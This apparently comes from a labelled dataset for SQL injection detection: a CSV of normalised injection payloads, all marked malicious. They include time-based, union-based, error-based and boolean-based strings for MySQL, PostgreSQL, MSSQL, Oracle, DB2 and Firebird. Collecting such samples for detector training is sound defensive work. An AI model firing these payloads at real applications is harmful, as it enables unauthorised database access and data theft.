row_index,payload_norm,label,sqli_type_hint
4560,1'|| ( select 'gnil' from dual where 7552 = 7552 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) ||',1,
4561,1 ) ) as uvep where 6016 = 6016 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,1,
4562,1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'vpqr' = 'vpqr,1,
4563,"1', ( select ( case when ( 1609 = 1609 ) then waitfor delay '0:0:5' else 1609* ( select 1609 from master..sysdatabases ) end ) )",1,
4564,"1"" ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ""cowu"" like ""cowu",1,
4565,-5211 union all select 1754--,1,
4566,"1"" ) as bpmk where 6412 = 6412 union all select null,null,null,null#",1,
4567,"1 ) ) as mgvw where 4923 = 4923 union all select null,null,null,null--",1,
4568,"1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'kqip' like 'kqip",1,
4569,"-9054"" ) as rgyu where 3792 = 3792 order by 1--",1,
4570,-6766' ) ) ) or 3038 = 3038,1,
4571,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'yqrt' like 'yqrt",1,
4572,1 ) as vqdh where 1603 = 1603,1,
4573,"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'yiem' = 'yiem",1,
4574,"1%"" ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
4575,"1' in boolean mode ) union all select null,null,null,null,null,null,null#",1,
4576,"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""cgpm"" like ""cgpm",1,
4577,"1"" where 5250 = 5250",1,
4578,"1' ) ) as umah where 3781 = 3781 union all select null,null,null,null#",1,
4579,( select ( case when ( 9525 = 9280 ) then 9525 else 9525* ( select 9525 from master..sysdatabases ) end ) ),1,
4580,"-9315' ) ) ) union all select 5057,5057,5057,5057,5057#",1,
4581,"-2962' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'hkjo' = 'hkjo",1,
4582,1 ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( 2197 = 2197,1,
4583,"1%"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
4584,1' where 3337 = 3337 and 8403 = 5760,1,
4585,"1"" or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
4586,"1 ) ) as faxr where 7972 = 7972 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
4587,"1"" ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""vurb"" like ""vurb",1,
4588,1 ) where 8094 = 8094,1,
4589,"1%' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",1,
